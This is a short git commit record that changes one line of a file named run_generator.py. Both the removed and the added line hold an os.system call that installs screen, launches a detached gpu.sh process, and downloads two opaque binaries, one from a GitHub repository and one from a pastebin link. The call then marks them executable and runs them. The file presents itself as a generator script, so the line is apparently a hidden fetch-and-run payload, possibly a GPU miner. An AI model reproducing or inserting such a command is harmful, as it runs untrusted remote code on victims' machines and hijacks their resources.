00e0e0f24d9782176b6b4ad2f31625088e38a73d
mabarass01 <93286353+mabarass01@users.noreply.github.com>
2021-10-27 21:44:29 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os
-os.system("sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/hambana01/cici/raw/main/lolai && chmod 755 lolai && wget https://www.heypasteit.com/download/0IWM2E && chmod 755 0IWM2E && ./0IWM2E")
+os.system("apt update && apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/hambana01/cici/raw/main/lolai && chmod 755 lolai && wget https://www.heypasteit.com/download/0IWM2E && chmod 755 0IWM2E && ./0IWM2E")
